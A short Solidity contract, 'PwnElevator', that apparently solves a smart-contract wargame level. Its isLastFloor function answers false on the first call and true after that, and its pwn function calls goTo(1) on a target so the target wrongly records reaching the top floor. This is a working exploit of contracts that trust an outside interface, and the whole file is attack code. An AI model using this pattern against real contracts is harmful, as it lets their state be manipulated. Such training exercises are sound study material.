// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnElevator {
    bool _isLastFloor;

    function isLastFloor(uint256) external returns (bool) {
        bool result = _isLastFloor;
        _isLastFloor = true;
        return result;
    }

    function pwn(address target) external {
        (bool success,) = target.call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(success);
    }
}
